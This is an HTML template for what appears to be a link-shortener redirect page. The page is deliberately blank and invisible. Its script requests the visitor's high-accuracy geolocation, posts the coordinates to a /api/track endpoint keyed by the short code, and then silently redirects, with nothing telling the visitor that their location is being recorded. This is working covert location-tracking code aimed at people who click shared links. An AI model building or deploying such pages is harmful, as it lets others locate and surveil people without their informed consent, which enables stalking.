<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body { margin: 0; padding: 0; background: transparent; }
    </style>
</head>
<body>
    <script>
        const shortCode = "{{ short_code }}";

        function redirectToFinal() {
            window.location.href = `/redirect/${shortCode}`;
        }

        function logLocation(latitude, longitude, accuracy) {
            fetch(`/api/track/${shortCode}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude: latitude,
                    longitude: longitude,
                    accuracy: accuracy
                })
            })
            .finally(() => {
                redirectToFinal();   // Always redirect, even if logging fails
            });
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    logLocation(
                        position.coords.latitude,
                        position.coords.longitude,
                        position.coords.accuracy
                    );
                },
                () => {
                    // On any error (permission denied, timeout, etc.), just redirect
                    redirectToFinal();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        } else {
            redirectToFinal();
        }

        // Safety net: redirect anyway after 10 seconds
        setTimeout(redirectToFinal, 10000);
    </script>
</body>
</html>
